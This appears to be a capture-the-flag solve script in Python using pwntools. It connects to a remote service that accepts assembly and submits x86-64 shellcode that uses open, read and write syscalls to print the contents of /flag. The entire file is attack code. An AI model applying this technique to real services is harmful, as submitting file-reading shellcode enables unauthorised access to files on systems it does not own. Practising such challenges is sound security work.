from pwn import *

# pwn.context.log_level = 'debug'

conn = remote(sys.argv[1], sys.argv[2])

conn.recvuntil(b"Enter your assembly code (end with an empty line):")

context.arch = 'amd64'

# Assembly shellcode to open, read, and print the /flag file
shellcode = """mov rdi, flag_str
    mov rax, 2              ; syscall: open
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov rdi, rax            ; fd
    mov rsi, flag_buf
    mov rdx, 100
    mov rax, 0              ; syscall: read
    syscall
    mov rdi, 1              ; stdout
    mov rsi, flag_buf
    mov rdx, 100
    mov rax, 1              ; syscall: write
    syscall
    mov rax, 60             ; syscall: exit
    xor rdi, rdi
    syscall
section .data
    flag_str db "/flag", 0
    flag_buf times 100 db 0

"""

conn.sendline(shellcode)
print(conn.recvall().decode())




